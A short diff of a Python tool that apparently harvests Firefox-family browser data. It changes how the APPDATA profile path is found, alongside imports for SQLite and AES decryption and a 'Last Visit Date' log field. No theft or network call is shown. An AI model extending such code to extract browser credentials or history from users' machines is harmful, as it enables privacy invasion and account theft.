@@ -5,7 +5,7 @@ from json import load
 from pathlib import Path
 from sqlite3 import connect
 from os.path import join, exists
-from os import environ, sep, mkdir
+from os import environ, mkdir
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 from glob import glob
@@ -211,7 +211,7 @@ Last Visit Date: {last_visit_date}
 def GeckoDriver():
     msgInfo = ""
     Log("===========GeckoDriver===========")
-    appdata = environ['USERPROFILE'] + sep + r'AppData\Roaming'
+    appdata = environ["APPDATA"]
     pathtofile = config.pathToLogs
 
     browsers = {
